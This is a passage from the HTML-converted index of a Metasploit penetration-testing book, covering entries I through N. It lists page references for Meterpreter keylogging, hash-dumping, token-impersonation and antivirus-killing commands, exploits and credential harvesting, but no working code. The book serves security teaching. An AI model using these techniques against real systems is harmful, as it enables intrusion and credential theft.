49pt;text-indent: -32pt;text-align: left;">HyperText Transfer Protocol (HTTP). <span class="s41">See </span>HTTP (Hyper Text Trans- fer Protocol)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">I</p><p class="s42" style="padding-top: 3pt;padding-left: 49pt;text-indent: -32pt;text-align: left;">ICMP (Internet Control Message Protocol), 19</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">IDS (intrusion detection systems), 13, 18, 229</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">idx <span class="s42">counter, 194</span></p><p class="s41" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">iexplorer.exe<span class="s42">, 113, 117, 237</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">iframe injection, 147</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">iframe replacement, 151</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">IIS (Internet Information Server), 269 IMAP (Internet Message Access Proto-</p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;line-height: 10pt;text-align: left;">col) fuzzer, 198</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Immunity Debugger, 112–115, 200,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">201, 208</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">F2 shortcut, 113, 114, 208</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">F5 shortcut, 114</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">F7 shortcut, 114, 208</p><p class="s56" style="padding-top: 1pt;padding-left: 122pt;text-indent: -32pt;text-align: left;">impersonate_token DOMAIN_NAME\\ USERNAME <span class="s42">command, 278</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">INC ECX <span class="s42">instructions, 209</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">include Msf::Exploit::Remote::</p><p class="s56" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">BrowserAutopwn: <span class="s42">directive, 179</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">include <span class="s42">statement, 188</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">incognito <span class="s42">command, 88, 282 incremental IP IDs, 22</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">indirect information gathering, 16 Infectious Media Generator, 157</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">info <span class="s42">command, 63, 126, 130, 205, 275</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">init.d <span class="s42">scripts, 20</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">initialization constructor, 130 <span class="s56">&#39;INJECTHERE</span>, SQL injection, 165 <span class="s41">insecure.org </span>site, 257</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">INT3 instructions, 222, 223</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">intelligence gathering, 15–33</p><p class="s42" style="padding-left: 122pt;text-indent: -21pt;text-align: left;">active information gathering, port scanning, 18–26</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 10pt;text-align: left;">custom scanners for, 31–33</p><p class="s42" style="padding-left: 112pt;text-indent: -10pt;text-align: left;">passive information gathering, 16–18 using Netcraft, 17</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;line-height: 11pt;text-align: left;">using <span class="s56">nslookup</span>, 18</p><p class="s41" style="padding-left: 101pt;text-indent: 10pt;text-align: left;">whois <span class="s42">lookups, 16–17 phase of PTES, 2</span></p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">simulated penetration test, 252–253 targeted scanning, 26–31</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">FTP scanning, 29</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">for Microsoft SQL Servers, 27–28 SMB scanning, 26–27</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">SNMP sweeping, 30–31 SSH server scanning, 28</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Intel x86 architecture, <span class="s41">NOP</span>, 111, 112 interactive Ruby shell, 241 interfaces, for Metasploit, 8–12</p><p class="s41" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">armitage<span class="s42">, 11–12</span></p><p class="s41" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfcli<span class="s42">, 9–11</span></p><p class="s41" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfconsole<span class="s42">, 9</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Internet-based penetration tests, 19 Internet Control Message Protocol</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(ICMP), 19</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Internet Explorer 7 Uninitialized Mem- ory Corruption (MS09-002), 155</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Internet Explorer Aurora exploit, 116–119, 147</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Internet Information Server (IIS), 269</p><p class="s42" style="padding-top: 3pt;padding-left: 49pt;text-indent: -32pt;text-align: left;">Internet Message Access Protocol (IMAP) fuzzer, 198</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">intrusion detection systems (IDS), 13, 18, 229</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">intrusion prevention system (IPS), 18, 110, 252</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">IP address, using Netcraft to find, 17</p><p class="s41" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">ipidseq <span class="s42">scan, 22</span></p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">IPS (intrusion prevention system), 18, 110, 252</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">irb <span class="s42">command, 241, 242</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">irb <span class="s42">shell, 97</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">is_admin?() <span class="s42">function, 243</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">is_uac_enabled?() <span class="s42">function, 243</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">ISO disc image, VMware Player, 268</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">J</p><p class="s42" style="padding-top: 3pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">Java applet attack, 136, 142–146,</p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">153–154, 156</p><p class="s56" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Java Applet Attack Method <span class="s42">option, SET main menu, 144, 154</span></p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Java Development Kit (JDK), Java applet attack, 136</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">JavaScript output, 12</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">JDK (Java Development Kit), Java applet attack, 136</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 11pt;text-align: left;">jduck, 79</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">JMP ESP address, 221 <span class="s56">jmp esp </span>command, 14 JMP instruction set, 216</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">K</p><p class="s42" style="padding-top: 3pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">KARMA, 177–178</p><p class="s41" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">karma.rc <span class="s42">file, 178, 182</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">Karmetasploit, 177–184</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">configuring, 178–179</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">credential harvesting, 181–182</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">getting shell, 182–184</p><p class="s42" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">launching attack, 179–181</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">Kelley, Josh, 185</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">Kennedy, David, 79, 135, 163, 185, 248</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">Kerberos token, 87, 89</p><p class="s41" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">keylog_recorder <span class="s42">module, 82</span></p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">keystroke logging, for Meterpreter, 81–82</p><p class="s56" style="padding-left: 28pt;text-indent: 0pt;line-height: 11pt;text-align: left;">keyscan_dump <span class="s42">command, 279</span></p><p class="s56" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">keyscan_start <span class="s42">command, 279</span></p><p class="s56" style="padding-left: 28pt;text-indent: 0pt;text-align: left;">keyscan_stop <span class="s42">command, 279</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">keystrokes, capturing, 282</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">Killav, 93, 282</p><p class="s55" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">L</p><p class="s42" style="padding-top: 3pt;padding-left: 83pt;text-indent: 0pt;text-align: center;">LAN Manager (LM) hashes, 82, 84</p><p class="s56" style="padding-left: 83pt;text-indent: 0pt;text-align: center;">LHOST <span class="s42">option, 62, 67, 86, 91, 96, 181,</span></p><p class="s42" style="padding-left: 42pt;text-indent: 0pt;text-align: center;">246, 276</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">lib/msf/core/exploit/http.rb <span class="s42">file, 130 Linux system</span></p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">dumping hashes on, 283 Metasploitable virtual machine, 251 as target machine, 268</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">LIST <span class="s42">command, 197, 199</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">listener, 8</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">listener handler, 86</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">list_tokens -g <span class="s42">command, 278</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">list_tokens -u <span class="s42">command, 88, 278</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">little-endian format, 207, 221</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">LM (LAN Manager) hashes, 82, 84</p><p class="s56" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">load auto_add_route <span class="s42">command, 91, 256, 258</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">load nessus <span class="s42">command, 49 </span>load nexpose <span class="s42">command, 43 </span>load sounds <span class="s42">command, 72</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Local System option, SQL Server Con- figuration Manager window, 271</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Log on as option, SQL Server Configu- ration Manager window, 271</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">LPORT <span class="s42">option, 62, 67, 72, 86, 96, 246</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">lsass.exe <span class="s42">process, 117</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">ls <span class="s42">command, 277</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">M</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Macaulay, Shane, 177</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">MailCarrier 2.51 SMTP commands, 216</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">mailcarrier_book.rb <span class="s42">file, 220</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">MailCarrier exploit, 218</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">make_nops() <span class="s42">function, 223 malicious ActiveX control, 184 malicious files, 119</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Management and Monitoring Tools checkbox, <span class="s41">Windows Components Wizard</span>, 269</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">man-left-in-the-middle attack, 150 mass brute force attack,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;line-height: 10pt;text-align: left;">SQLPwnage, 172</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">mass client-side attack, 175–176 mass emails, 142</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">mass scan and dictionary brute option, Fast-Track, 169</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">McAfee antivirus software, 80 MD5 checksum, 242</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Melvin, John, 163</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Memelli, Matteo, 197</p><p class="s42" style="padding-top: 5pt;padding-left: 16pt;text-indent: 0pt;text-align: left;"><span class="s56">MessageBoxA </span>function, 97 <span class="s41">messages </span>log file, 180 Metasploitable, 251–252, 262</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Metasploit Browser Exploit Method option, SET main menu, 147, 154</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Metasploit client-side exploit, 153–154 Metasploit Express, vs. Pro, 14 Metasploit Framework (MSF), 7–14</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">interfaces for, 8–12</p><p class="s41" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">armitage<span class="s42">, 11–12</span></p><p class="s41" style="padding-left: 38pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfcli<span class="s42">, 9–11</span></p><p class="s41" style="padding-left: 38pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfconsole<span class="s42">, 9</span></p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">terminology in, 7–8</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">utilities for, 12–14</p><p class="s41" style="padding-left: 38pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfencode<span class="s42">, 13</span></p><p class="s41" style="padding-left: 38pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfpayload<span class="s42">, 12–13</span></p><p class="s41" style="padding-left: 38pt;text-indent: 0pt;line-height: 11pt;text-align: left;">nasm shell<span class="s42">, 13–14</span></p><p class="s42" style="padding-left: 16pt;text-indent: 10pt;text-align: left;">working with databases in, 20–25 Metasploit listener, 141, 256 Metasploit Pro, vs. Express, 14 Meterpreter, 75–97</p><p class="s42" style="padding-left: 13pt;text-indent: 0pt;text-align: center;">commands for, 80–82, 277–279</p><p class="s42" style="padding-left: 10pt;text-indent: 0pt;text-align: center;">keystroke logging, 81–82</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: center;">post exploitation, 282–283</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">screenshot, 80–81</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">sysinfo, 81</p><p class="s42" style="padding-left: 49pt;text-indent: -21pt;text-align: left;">compromising Windows XP virtual machine, 76–82</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">attacking MS SQL, 76–78 brute forcing MS SQL server,</p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">78–79</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanning for ports with <span class="s41">nmap</span>, 76</p><p class="s56" style="padding-left: 27pt;text-indent: 10pt;text-align: left;">xp_cmdshell<span class="s42">, 79–80 manipulating Windows APIs with</span></p><p class="s42" style="padding-left: 27pt;text-indent: 21pt;text-align: left;">Railgun add-on, 97 and password hashes, 82–84</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;line-height: 11pt;text-align: left;">dumping, 83–84</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">extracting, 82–83</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">passing, 84–85</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">pivoting with, 89–91</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">post exploitation modules for, 95 privilege escalation with, 85–87 scripts for, 92–95</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">API for, 241–244</p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">creating, 244–250</p><p class="s56" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">hashdump<span class="s42">, 93</span></p><p class="s56" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">killav<span class="s42">, 93</span></p><p class="s56" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">migrate<span class="s42">, 92–93</span></p><p class="s42" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">overview, 235–241</p><p class="s56" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">packetrecorder<span class="s42">, 93</span></p><p class="s56" style="padding-left: 38pt;text-indent: 0pt;text-align: left;">persistence<span class="s42">, 94–95</span></p><p class="s42" style="padding-top: 3pt;padding-left: 112pt;text-indent: 0pt;text-align: left;">rules for, 244</p><p class="s56" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">scraper<span class="s42">, 93–94</span></p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">token impersonation with, 87–89 upgrading command shell to, 95–97</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Meterpreter shell, 68, 156</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Microsoft IIS, vulnerability in WebDAV implementations, 127</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Security Bulletin</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">MS10-002, 116</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Microsoft SQL Attack Tools menu, MSSQL Bruter, 168</p><p class="s42" style="padding-left: 101pt;text-indent: -10pt;text-align: left;">Microsoft SQL Server attacking, 76–78</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">brute forcing, 78–79</p><p class="s42" style="padding-left: 122pt;text-indent: -21pt;text-align: left;">getting command execution on, 186–187</p><p class="s42" style="padding-left: 112pt;text-indent: -10pt;text-align: left;">injection with Fast-Track tool, 164–174 manual injection, 167–168</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;line-height: 10pt;text-align: left;">MSSQL Bruter, 168–172</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">POST parameter attack, 166–167 query string attack, 165–166 <span class="s56">SQLPwnage</span>, 172–174</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">targeted scanning for, 27–28 on Windows XP, 269–271</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Microsoft SQL Tools option, 165, 172 Microsoft Windows–based payloads, 60 Microsoft Windows</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">CreateSizedDIBSECTION Stack Buffer Overflow, 119</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">migrate <span class="s42">command, 82, 92–93 </span>migrate -f <span class="s42">command, 119 </span>migrate <span class="s58">PID </span><span class="s42">command, 278 Mitnick, Kevin, 248</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Mixed-mode authentication, MSSQL Bruter, 168</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">mixins</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">defined, 31</p><p class="s42" style="padding-left: 90pt;text-indent: 10pt;text-align: left;">for Meterpreter scripts, 242–244 modules, 185–196</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">and code reuse, 196 creating, 189–196</p><p class="s42" style="padding-left: 122pt;text-indent: -10pt;text-align: left;">converting from hex to binary, 192–194</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;line-height: 11pt;text-align: left;">counters in, 194–195</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">running exploit, 195–196 running Shell exploit, 190–192 using PowerShell, 189–190</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">defined, 8</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">exploring, 187–188</p><p class="s42" style="padding-left: 122pt;text-indent: -21pt;text-align: left;">getting command execution on Microsoft SQL, 186–187</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">modules <span class="s42">directory, 191</span></p><p class="s42" style="padding-top: 3pt;padding-left: 15pt;text-indent: 0pt;text-align: left;">MS08-067 exploit, 59, 60, 67, 96</p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">ms08_067_netapi <span class="s42">module, 10, 59</span></p><p class="s42" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">MS11-006 exploit, 119</p><p class="s42" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">MSF (Metasploit Framework). <span class="s41">See </span>Meta- sploit Framework (MSF)</p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">Msf::Auxiliary::Scanner <span class="s42">mixin, 32 MSF binary payload, 185</span></p><p class="s41" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfbook <span class="s42">database, 20, 24</span></p><p class="s42" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msf exploit(<span class="s56">ms08_067_netapi</span>) prompt, 60</p><p class="s41" style="padding-left: 15pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfcli<span class="s42">, 9–11, 86, 281</span></p><p class="s41" style="padding-left: 15pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfconsole<span class="s42">, 9, 20, 32, 37, 42</span></p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;line-height: 11pt;text-align: left;">customizing <span class="s41">msfconsole</span>, 255–257</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;line-height: 11pt;text-align: left;">commands for, 275–277</p><p class="s56" style="padding-left: 37pt;text-indent: 0pt;text-align: left;">info<span class="s42">, 63</span></p><p class="s56" style="padding-left: 37pt;text-indent: 0pt;text-align: left;">save<span class="s42">, 64</span></p><p class="s56" style="padding-left: 37pt;text-indent: 0pt;text-align: left;">set <span class="s42">and </span>unset<span class="s42">, 63 </span>setg <span class="s42">and </span>unsetg<span class="s42">, 64 </span>show auxiliary<span class="s42">, 58</span></p><p class="s56" style="padding-left: 37pt;text-indent: 0pt;line-height: 11pt;text-align: left;">show exploits<span class="s42">, 58</span></p><p class="s56" style="padding-left: 37pt;text-indent: 0pt;text-align: left;">show options<span class="s42">, 58–60</span></p><p class="s56" style="padding-left: 37pt;text-indent: 0pt;text-align: left;">show payloads<span class="s42">, 60–62</span></p><p class="s56" style="padding-left: 37pt;text-indent: 0pt;text-align: left;">show targ<span class="s42">, 62–63</span></p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">customizing, 255–257</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">running NeXpose within, 43–44 running <span class="s41">nmap </span>from, 24–25 testing exploits, 220</p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfconsole -r karma<span class="s42">.rc command, 180</span></p><p class="s41" style="padding-left: 15pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf.doc <span class="s42">file, 120</span></p><p class="s41" style="padding-left: 15pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msfencode<span class="s42">, 13, 102–103, 280</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfencode -h <span class="s42">command, 13, 102, 280</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">Msf::Exploit::Remote::Seh <span class="s42">mixin, 228</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">Msf::Exploit::Remote::Tcp <span class="s42">mixin, 32, 219</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">Msf::Exploit::Remote::Udp <span class="s42">mixin, 228</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msf MS08-067 <span class="s42">prompt, 62</span></p><p class="s41" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfpayload<span class="s42">, 12–13</span></p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">commands for, 280</p><p class="s42" style="padding-left: 26pt;text-indent: 0pt;text-align: left;">creating binaries with, 100–101</p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfpayload <span class="s42">command, 103, 112</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfpayload -h <span class="s42">command, 13, 280</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfpescan <span class="s42">command, 206</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msf <span class="s42">prompt, 59</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfupdate <span class="s42">command, 274</span></p><p class="s56" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">::Msf::Util::EXE.to_win32pe</p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">function, 246</p><p class="s56" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">Msf::Util::EXE.to_win32pe(framework, payload.encoded) <span class="s42">option, 192</span></p><p class="s41" style="padding-left: 15pt;text-indent: 0pt;text-align: left;">msfvenom<span class="s42">, 108, 281</span></p><p class="s56" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">MSSQL Bruter<span class="s42">, Microsoft SQL injection, 168–172</span></p><p class="s42" style="padding-left: 15pt;text-indent: 0pt;text-align: left;"><span class="s56">MSSQL Bruter </span>option, 169 <span class="s41">mssql_commands.rb </span>file, 188 <span class="s41">mssql_exec </span>auxiliary module, 187</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">MSSQL Injector option, 165 <span class="s41">mssql_login </span>module, 78–79 <span class="s41">mssql_payload </span>exploit, and</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PowerShell, 189</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">mssql_payload <span class="s42">module, 79–80</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">mssql_ping <span class="s42">module, 27, 77–78</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">mssql_powershell <span class="s42">module, 185</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">mssql_powershell.rb <span class="s42">file, 189, 191, 195</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">mssql.rb <span class="s42">file, 188, 191, 192, 195</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Mudge, Raphael, 11</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">multi-attack vector, 153–157</p><p class="s56" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Multi-Attack Web Method <span class="s42">option, SET main menu, 154</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">multi-encoding, 103–104</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">multi-handler, Meterpreter sessions, 239 multi-handler listener, 120</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">multi/handler <span class="s42">module, 100–101, 249</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">multi/http/tomcat_mgr_deploy <span class="s42">exploit, 261</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">multi_meter_inject <span class="s42">command, 235, 237</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Muts, 226</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">N</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Nano, <span class="s57">CTRL</span>-W shortcut, 188</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">nasm shell<span class="s42">, 